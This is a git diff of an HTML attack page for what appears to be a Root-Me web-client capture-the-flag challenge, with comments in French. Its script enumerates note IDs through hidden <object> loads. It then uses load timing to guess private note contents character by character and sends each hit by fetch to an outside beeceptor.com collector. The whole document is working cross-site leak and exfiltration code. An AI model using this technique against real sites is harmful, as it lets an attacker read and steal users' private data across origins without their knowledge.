@@ -3,32 +3,50 @@
 <head>
 </head>
 <body>
-<script>const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_', base = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
-let id = 0;
+<script>
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_', base = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
+let id = 2270;
 
 async function findValidUrl() {
     while (true) {
         let url = base + id;
         let start = Date.now();
-        let img = new Image();
 
-        img.onload = img.onerror = () => {
-            let duration = Date.now() - start;
-            if (duration < 2000) return console.log("URL valide :", url);//, noteSearch(url + "/");
+        let obj = document.createElement('object');
+        obj.data = url;
+        obj.type = 'text/html';  // Ou un autre type en fonction de ce que tu attends du serveur
+
+        // Événement de chargement réussi
+        obj.onload = () => {
+            console.log("URL valide :", url);  // Si l'objet est chargé en moins de 2000ms, c'est une URL valide
         };
 
-        img.src = url;
-        await new Promise(r => setTimeout(r, 100)); // Wait before next request
+        // Événement d'erreur
+        obj.onerror = () => {
+            let duration = Date.now() - start;
+            console.log("Erreur lors du chargement de l'URL :", url);
+        };
+
+        // Ajout de l'élément <object> à la page (non visible)
+        document.body.appendChild(obj);
+
+        // Attente avant la prochaine requête
+        await new Promise(r => setTimeout(r, 100));
         id++;
-    	if(id > 100) break;
+
+        if(id > 2300) break;
     }
 }
 
 function makeRequest(url, added) {
     let start = Date.now();
-    let img = new Image();
 
-    img.onload = img.onerror = () => {
+    let obj = document.createElement('object');
+    obj.data = url;
+    obj.type = 'text/html';
+
+    // Event listeners pour onload et onerror
+    obj.onload = obj.onerror = () => {
         let duration = Date.now() - start;
         if (duration > 2000) {
             fetch("https://rootmeleak2.free.beeceptor.com/" + added);
@@ -37,12 +55,16 @@ function makeRequest(url, added) {
         }
     };
 
-    img.src = url;
+    // Ajout de l'élément <object> à la page (non visible)
+    document.body.appendChild(obj);
 }
 
-function noteSearch(url) { chars.split('').forEach(c => makeRequest(url + c, c)); }
+function noteSearch(url) {
+    chars.split('').forEach(c => makeRequest(url + c, c));
+}
 
 findValidUrl();
+
 </script>
     
 </body>
